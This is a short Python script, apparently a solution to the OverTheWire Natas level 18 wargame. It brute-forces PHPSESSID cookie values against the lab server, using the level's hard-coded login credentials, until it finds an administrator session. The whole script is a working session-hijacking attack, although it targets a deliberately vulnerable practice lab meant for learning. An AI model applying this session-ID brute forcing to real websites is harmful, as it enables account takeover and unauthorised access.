import requests

for i in range(640):
        _jar = requests.cookies.RequestsCookieJar()
        _jar.set('PHPSESSID', str(i), domain='natas18.natas.labs.overthewire.org', path='/home/')
	#jar = dict(PHPSESSID=str(i))
	c = requests.get('http://natas18.natas.labs.overthewire.org', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=_jar)
	if c.text.find("You are an admin.") != -1:
		print "Here's our fella: " + str(i)
	else:
		print "Failed on: " + str(i)

